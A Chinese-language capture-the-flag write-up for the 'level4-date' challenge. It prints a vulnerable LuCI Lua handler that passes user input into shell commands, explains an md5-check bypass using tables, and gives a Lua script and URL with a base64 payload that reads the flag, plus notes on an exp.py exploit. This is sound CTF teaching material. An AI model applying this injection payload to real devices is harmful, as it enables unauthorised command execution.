# level4-date writeup
## 过程
* 分析下载得到的源码
  * upload.lua 处理参数的 lua 文件
  * base64.lua 提供 base64 加解密函数
  * md5.lua 提供 md5 计算函数
  * json.lua 提供序列化函数
* upload.lua 的处理逻辑是对接收到的参数 code 进行 base64 解密，反序列化后得到一个 date 类的对象。这个对象包含了三个参数，a，b，file。如果 a 和 b 的值不同但是 md5 值相同，则触发 _wakeup 函数，将 file 的内容写入文件中，并将该内容进行正则，把空格换行以及 tab 都替换成空。
  ```lua
        -- base64 解密，反序列化后得到一个 date 类的对象
        json = require "luci.json"
        local base64 = require"luci.base64"
        if code then
            local decoded_code = base64.decode(code)
            local success, obj = pcall(json.decode, decoded_code)
            if success and type(obj) == "table" then
                setmetatable(obj, { __index = date })
                obj:__wakeup()
            else
                http.status(400, "Bad Request")
                http.write(decoded_code)
            end
        else
            http.status(400, "Bad Request")
            http.write("")
        end
      -- 如果 a 和 b 的值不同但是 md5 值相同，则触发 _wakeup 函数
      --
      function date:__wakeup()
        if self.a ~= self.b and md5.sum(self.a) == md5.sum(self.b) then
            local content = self.file
            local uuid = util.exec("echo $RANDOM"):gsub("\n", "") .. ".txt"
            util.exec("echo '" .. content .. "' > " .. uuid)
            local data = util.exec("cat " .. uuid):gsub("%s+", "")
            -- http.write(encoded)
            http.write(util.exec("cat " .. data))
        else
            http.status(400, "Bad Request")
            http.write("")
        end
      end
  ```
* 因此构造一个 code 参数，首先 a，b 可以是不同的数组，在 md5.lua 中的函数对数组无法计算 md5 值而返回 none，可以利用该方法对 md5 值比较进行绕开，file的值为 "\\f\\l\\a\\g"
  ```lua
    json = require "json"
    local base64 = require'base64'
    local date = {
        a = {},
        b = {},
        file = "\\f\\l\\a\\g"
    }
    local function Error(message, code)
        return {
            message = message,
            code = code
        }
    end
    date.a = Error("payload", 1)
    date.b = Error("payload", 2)
    -- 序列化date对象为字符串
    local serialized_str = json.encode(date)
    local encoded = base64.encode( serialized_str )

    -- 输出序列化和编码后的字符串
    print(encoded)
    --eyJhIjp7Im1lc3NhZ2UiOiJwYXlsb2FkIiwiY29kZSI6MX0sImZpbGUiOiJcXGZcXGxcXGFcXGciLCJiIjp7Im1lc3NhZ2UiOiJwYXlsb2FkIiwiY29kZSI6Mn19
  ```
* 通过访问`http://address/cgi-bin/luci/admin/upload/upload/date/eyJhIjp7Im1lc3NhZ2UiOiJwYXlsb2FkIiwiY29kZSI6MX0sImZpbGUiOiJcXGZcXGxcXGFcXGciLCJiIjp7Im1lc3NhZ2UiOiJwYXlsb2FkIiwiY29kZSI6Mn19,得到 flag
* ![flag]()

## exp 利用说明
* 在 serialize 目录下运行 exp.py 即可，确保其余 lua 文件都在同一目录下
* 根据命令行提示，给出对应参数
* 如果你想要自己创造新的 payload
  * 请适当修改 serialize.lua 内的对象内的值，运行该文件得到新的 payload